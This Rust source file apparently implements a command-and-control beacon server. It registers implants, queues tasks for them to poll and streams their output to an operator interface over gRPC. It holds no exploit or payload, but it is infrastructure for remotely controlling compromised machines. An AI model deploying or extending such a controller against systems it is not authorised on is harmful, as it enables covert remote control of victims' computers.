use std::collections::HashMap;
use std::ops::Deref;
use std::pin::Pin;
use std::sync::Arc;

use futures_core::Stream;
use futures_util::StreamExt;
use tokio::sync::mpsc;
use tokio::sync::RwLock;
use tonic::{Request, Response, Status};
use uuid::Uuid;

use crate::implant::{Implant, Implants};

use crate::iface::{
    self, interface_service_server::InterfaceService, AddTaskRequest, AddTaskResponse,
    ClientListRequest, ClientListResponse,
};
use crate::tasks::{
    beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, OutputRequest,
    OutputResponse, PollRequest, PollResponse,
};

const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant

#[derive(Debug, Default)]
pub struct Beacon {
    implants: Implants,
    running_tasks: RwLock<HashMap<Uuid, Vec<mpsc::UnboundedSender<String>>>>,
}
impl Beacon {
    pub fn new() -> Arc<Self> {
        Arc::new(Self::default())
    }
}
impl Deref for Beacon {
    type Target = Implants;

    fn deref(&self) -> &Self::Target {
        &self.implants
    }
}

#[tonic::async_trait]
impl BeaconService for Arc<Beacon> {
    async fn connection(
        &self,
        _request: Request<ConnectionRequest>,
    ) -> Result<Response<ConnectionResponse>, Status> {
        let id = Uuid::new_v4();

        println!("Got a connection request: {id}");

        self.implants.insert(id, Implant::default()).await;

        Ok(Response::new(ConnectionResponse {
            uuid: id.to_string(),
            heartbeat: HEARTBEAT,
        }))
    }

    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
        let id = uuid_parse(&request.into_inner().uuid)?;

        let implant = self
            .implants
            .get(&id)
            .await
            .ok_or(Status::not_found("Client doesn't exist or isn't connected."))?;

        let task = implant.pop_task().await.map(|t| t.into());
        Ok(Response::new(PollResponse { task }))
    }

    async fn output(
        &self,
        request: Request<tonic::Streaming<OutputRequest>>,
    ) -> Result<Response<OutputResponse>, Status> {
        let mut stream = request.into_inner();

        while let Some(request) = stream.next().await {
            let request = request?;
            let task_id = uuid_parse(&request.task_uuid)?;

            let tasks = self.running_tasks.read().await;

            for s in tasks
                .get(&task_id)
                .ok_or(Status::not_found("Running task uuid not found."))?
                .iter()
            {
                s.send(request.line.clone())
                    .map_err(|_| Status::aborted("Interface channel closed."))?;
            }
        }
        Ok(Response::new(OutputResponse {}))
    }
}

#[tonic::async_trait]
impl InterfaceService for Arc<Beacon> {
    async fn connection(
        &self,
        _request: Request<iface::ConnectionRequest>,
    ) -> Result<Response<iface::ConnectionResponse>, Status> {
        let id = Uuid::new_v4();

        println!("Got an interface connection request: {id}");

        // let mut map = self.implants.write().await;
        // map.insert(id, Implant::default());

        Ok(Response::new(iface::ConnectionResponse {
            uuid: id.to_string(),
        }))
    }

    async fn get_list(
        &self,
        _request: Request<ClientListRequest>,
    ) -> Result<Response<ClientListResponse>, Status> {
        // let id = uuid_parse(&request.into_inner().uuid)?;

        Ok(Response::new(ClientListResponse {
            list: self.implants.list().await,
        }))
    }

    type AddTaskStream =
        Pin<Box<dyn Stream<Item = Result<AddTaskResponse, Status>> + Send + 'static>>;

    async fn add_task(
        &self,
        request: Request<AddTaskRequest>,
    ) -> Result<Response<Self::AddTaskStream>, Status> {
        let request = request.into_inner();
        let id = uuid_parse(&request.client_uuid)?;

        let task = request
            .task
            .ok_or(Status::invalid_argument("Task should not be None."))?;
        let task_id = uuid_parse(&task.uuid)?;

        let implant = self
            .implants
            .get(&id)
            .await
            .ok_or(Status::not_found("Implant doesn't exist or isn't connected."))?;
        implant.push_task(task.into()).await;

        let (tx, mut rx) = mpsc::unbounded_channel::<String>();
        let mut tasks = self.running_tasks.write().await;
        tasks.insert(task_id, vec![tx]);

        let output = async_stream::try_stream! {
            while let Some(line) = rx.recv().await {
                yield AddTaskResponse { line: Some(line) };
            }
        };
        Ok(Response::new(Box::pin(output) as Self::AddTaskStream))
    }
}

fn uuid_parse(s: &str) -> Result<Uuid, Status> {
    Uuid::parse_str(s).map_err(|_| Status::invalid_argument("Failed to parse uuid."))
}
